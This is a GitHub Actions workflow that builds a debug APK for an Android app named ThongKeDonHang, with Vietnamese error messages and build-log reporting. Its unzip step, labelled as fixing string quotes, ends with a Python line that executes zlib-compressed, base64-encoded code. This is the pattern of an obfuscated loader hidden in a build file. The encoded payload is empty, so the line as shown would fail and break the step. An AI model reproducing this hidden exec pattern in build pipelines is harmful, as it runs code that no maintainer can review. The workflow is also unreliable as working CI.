name: Build ThongKeDonHang APK

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  build-apk:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Extract ZIP and Fix All String Quotes
        run: |
          if [ ! -f "settings.gradle.kts" ] && [ ! -f "ThongKeDonHang/settings.gradle.kts" ]; then
            ZIP_FILE=$(find . -maxdepth 2 -name "*.zip" | head -n 1)
            if [ -n "$ZIP_FILE" ]; then
              unzip -q -o "$ZIP_FILE" -d .
            else
              echo "Loi: Chua co file ZIP trong kho chua"
              exit 1
            fi
          fi
          python3 -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('')))"

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Gradle 8.7
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.7'
          cache-disabled: true

      - name: Build Debug APK
        run: |
          if [ -d "ThongKeDonHang" ] && [ -f "ThongKeDonHang/settings.gradle.kts" ]; then
            cd ThongKeDonHang
          fi
          set +e
          gradle assembleDebug --console=plain > build_output.log 2>&1
          EXIT_CODE=$?
          cat build_output.log
          if [ $EXIT_CODE -ne 0 ]; then
            echo "================ DONG LOI CU THE ================"
            grep -E "(^e: |FAILURE:|What went wrong:|> Task .* FAILED|Exception|Error)" -A 6 build_output.log
            echo "================================================="
            echo "### Chi tiet loi bien dich:" >> $GITHUB_STEP_SUMMARY
            echo '```text' >> $GITHUB_STEP_SUMMARY
            grep -E "(^e: |FAILURE:|What went wrong:|> Task .* FAILED|Exception|Error)" -A 6 build_output.log | head -n 80 >> $GITHUB_STEP_SUMMARY
            echo '```' >> $GITHUB_STEP_SUMMARY
            exit $EXIT_CODE
          fi

      - name: Upload Debug APK
        uses: actions/upload-artifact@v4
        with:
          name: ThongKeDonHang-debug-apk
          path: "**/app/build/outputs/apk/debug/app-debug.apk"
